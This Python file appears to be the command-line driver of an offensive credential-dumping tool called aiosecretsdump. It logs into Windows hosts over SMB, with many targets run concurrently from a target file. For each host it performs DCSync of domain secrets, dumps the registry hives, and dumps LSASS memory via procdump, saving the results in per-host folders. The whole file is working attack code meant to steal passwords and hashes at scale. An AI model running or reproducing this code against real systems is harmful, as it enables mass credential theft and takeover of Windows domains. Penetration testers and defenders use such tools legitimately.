import sys
import asyncio
import datetime
import traceback
from pathlib import Path

from aiosmb.commons.connection.url import SMBConnectionURL
from aiosmb.commons.interfaces.machine import SMBMachine

from aiosecretsdump import logger
from aiosecretsdump.domainsecrets.methods import smb_dcsync
from aiosecretsdump.registry.methods import smb_registry
from aiosecretsdump.lsass.methods import smb_task_lsass

def format_tb(err):
	return '\r\n'.join(traceback.format_tb(err.__traceback__))

async def worker(in_q, out_q, args, output_root):
	while True:
		try:
			connection = await in_q.get()
			if connection is None:
				await out_q.put(None)
				return
			
			tname = connection.target.get_hostname_or_ip()

			# creating subdir for target
			tf = datetime.datetime.utcnow().strftime("%Y_%m_%d-%H%M")
			con_folder = output_root.joinpath(tname.replace('.','_'), tf)
			con_folder.mkdir(parents=True, exist_ok=True)

			logger.info('[+] Connecting to %s' % tname )
			
			try:
				await connection.login()
				logger.info('[+] Connected to %s' % tname )
			except Exception as e:
				logger.exception('Failed to connect to %s' % tname)
				if con_folder is not None:
					with open(con_folder.joinpath('error.txt'), 'w') as f:
						f.write('Error during initial SMB connection! \r\n Error text: \r\n%s' % str(e))
				
				continue
			
			async with SMBMachine(connection) as machine:

				if args.cmd in ['dcsync', 'all']:
					if con_folder is not None:
						dcsync_folder = con_folder.joinpath('dcsync')
						dcsync_folder.mkdir(parents=True, exist_ok=True)
					
					_, err = await smb_dcsync(machine, dcsync_folder)
					if err is not None:
						logger.error(str(err))
						if con_folder is not None:
							with open(dcsync_folder.joinpath('error.txt'), 'w') as f:
								f.write('Error during DCSYNC operation! \r\n Error text: \r\n%s' % str(err))

				if args.cmd in ['registry', 'all']:
					if con_folder is not None:
						registry_folder = con_folder.joinpath('registry')
						registry_folder.mkdir(parents=True, exist_ok=True)
					_, err = await smb_registry(machine, registry_folder)
					if err is not None:
						logger.error(format_tb(err))
						if con_folder is not None:
							with open(registry_folder.joinpath('error.txt'), 'w') as f:
								f.write('Error during REGDUMP operation! \r\n Error text: \r\n%s' % str(err))

					

				if args.cmd in ['lsass', 'all']:
					if con_folder is not None:
						lsass_folder = con_folder.joinpath('lsass')
						lsass_folder.mkdir(parents=True, exist_ok=True)

					#checking is procdump is available
					if Path(args.bin_folder).joinpath('procdump.exe').exists() is False:
						logger.error('[-] Could not locate procdump binaries! Please specify the correct folder where procdump bins are located!')
					
					else:
						_, err = await smb_task_lsass(machine, lsass_folder, procdump_local_path=args.bin_folder)
						if err is not None:
							logger.error(format_tb(err))
							if con_folder is not None:
								with open(lsass_folder.joinpath('error.txt'), 'w') as f:
									f.write('Error during LSASS operation! \r\n Error text: \r\n%s' % str(err))

			await out_q.put(1)
		
		except Exception as e:
			logger.exception('[-] Worker died! Reason: %s' % str(e))
			return

async def amain():
	import argparse

	parser = argparse.ArgumentParser(description='Secretsdump')
	parser.add_argument('-v', '--verbose', action='count', default=0)
	parser.add_argument('-t','--target-file', help='file with target hosts, one per line.')
	parser.add_argument('-o','--output-folder', default='results', help='file to write all results to. please use full path, will create new directories recursively!')
	parser.add_argument('-w','--worker-count', type=int, default = 50, help='Maximum worker count')
	parser.add_argument('-b','--bin-folder', default = 'bins', help='Location of the binary utils folder. (where procdump.exe and procdump64.exe is)') 
	parser.add_argument('cmd', choices=['dcsync', 'registry', 'lsass', 'all'])
	parser.add_argument('smb_url', help = 'the SMB connection URL string')


	args = parser.parse_args()

	worker_tasks = []
	process_q = asyncio.Queue()
	out_q = asyncio.Queue()
	#creating results directory
	output_root = Path(args.output_folder)
	output_root.mkdir(parents=True, exist_ok=True)


	connections = []
	# checking if SMB url is parsable
	connection_url = SMBConnectionURL(args.smb_url)
	connections.append(connection_url.get_connection())

	for _ in range(min(len(connections), args.worker_count)):
		wt = asyncio.create_task(worker(process_q, out_q, args, output_root))
		worker_tasks.append(wt)

	# parsing targets
	if args.target_file is not None:
		with open(args.target_file, 'r') as f:
			for line in f:
				line = line.strip()
				connection = connection_url.create_connection_newtarget(line)
				connections.append(connection)
	
	# main
	for connection in connections:
		await process_q.put(connection)

	
	for _ in range(len(worker_tasks)):
		await process_q.put(None)
	
	finished_workers = 0
	while True:
		res = await out_q.get()
		if res is None:
			finished_workers += 1
			if finished_workers >= len(worker_tasks):
				break


	print('Done!')

def main():
	asyncio.run(amain())

if __name__ == '__main__':
	main()
